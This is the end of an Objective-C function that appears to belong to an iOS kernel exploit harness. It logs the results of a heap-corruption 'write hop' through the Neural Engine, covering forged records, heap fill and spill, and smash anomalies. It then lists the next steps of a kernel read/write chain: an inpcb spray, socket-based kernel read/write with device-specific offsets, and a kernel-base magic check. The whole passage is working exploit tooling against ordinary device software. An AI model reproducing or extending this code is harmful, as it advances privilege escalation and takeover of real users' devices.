        p088_log(@"Kernel-target volley: fires=%u anomalies=%u. Inconclusive.", bFires, bAnom);
    }
#else
    if (touches > 0) {
        p088_log(@"WRITE-HOP PROVEN (in-process): ANE wrote into T (sid %u) chosen by", tSid);
        p088_log(@"a FORGED record sid across the 43748 spill. Content control was");
        p088_log(@"already P080's result (y from staged inputs); THIS datum is the");
        p088_log(@"destination control. hasKwrite=EVIDENCED-INPROC (board event).");
        [[P007Board shared] recordEvent:@"p088_write_hop" kind:@"write_evidence"
                                 detail:[NSString stringWithFormat:@"T=%u rounds_with_touch=%u", tSid, touches]
                                 source:@"p088"];
    } else if (fillHits > 0) {
        p088_log(@"FILL LANDED (D2 hits=%u) but not in B's window. Spill pair: %@",
                 fillHits, (witness >= 0) ? @"MEASURED (witness run is live-adjacent)"
                                          : @"not proven this tap");
        if (witness >= 0)
            p088_log(@"  spill target = run[%d]; v7 conv rounds punch it + a filler", witness);
        p088_log(@"  into the volley so B owns the chunk while A's fill writes the forge.");
        p088_log(@"Occupancy proven, conversion NO.");
        [[P007Board shared] recordEvent:@"p088_session" kind:@"occupancy"
                                 detail:[NSString stringWithFormat:@"fill=%u fires=%u anom=%u", fillHits, bFires, bAnom]
                                 source:@"p088"];
    } else if (bAnom > 0) {
        p088_log(@"B consume anomalies (%u) without T touch or sentinel hits: the smash");
        p088_log(@"reached B's request OUTSIDE the sentinel run - run not contiguous.");
        p088_log(@"Widen the run / re-burst before punching. Conversion NO.");
        [[P007Board shared] recordEvent:@"p088_session" kind:@"smash_outside_run"
                                 detail:[NSString stringWithFormat:@"anom=%u fires=%u", bAnom, bFires]
                                 source:@"p088"];
    } else {
        p088_log(@"MISS - no T touch, no sentinel hit, B clean across %u fires. Either", bFires);
        p088_log(@"the fill did not fire (check the CheckandPrewire IPS panic) or the");
        p088_log(@"run was nowhere near A's chunk. Rerun fresh boot.");
        [[P007Board shared] recordEvent:@"p088_session" kind:@"miss"
                                 detail:[NSString stringWithFormat:@"clean fires=%u", bFires]
                                 source:@"p088"];
    }
#endif
    p088_log(@"KRW CHAIN NEXT (102/103/106):");
    p088_log(@"  1. If write hop proven: P088_KERNEL_TARGET 1 build (fresh boot,");
    p088_log(@"     PANIC POSSIBLE, completion-only evidence - no byte proof without kread).");
    p088_log(@"  2. Ghidra: iomd_field_scan.py OFF=0x68 -> name the IOMD consumer;");
    p088_log(@"     decompile DART-map vtable+0x650 implementer (Chain 4 over-release).");
    p088_log(@"  3. Lab: reclaim + inpcb spray -> read inpcb kaddr -> SocketKRW.Arm");
    p088_log(@"     (A14_23F77_INPCB_ICMP6FILT 0x148, SO_PCB 0x18).");
    p088_log(@"  4. kread32(kbase)==0xfeedfacf -> hasKread=YES -> Bootstrap HOLD lifts.");
    p088_log(@"Honesty: hasKread=NO. It flips ONLY on kread32(kbase)==0xfeedfacf via");
    p088_log(@"Lum1naSocketKRW verify (Chain 4 kvad supply). A surface diff NEVER");
    p088_log(@"sets it. Conversion bar untouched. One TAP per force-quit; fresh boot next.");

    p088_free_surfs(gs, nGs);
    CFRelease(T);
    if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
    NSString *ret = g_p088_buf;
    g_p088_buf = nil;
    return ret;
}

@end
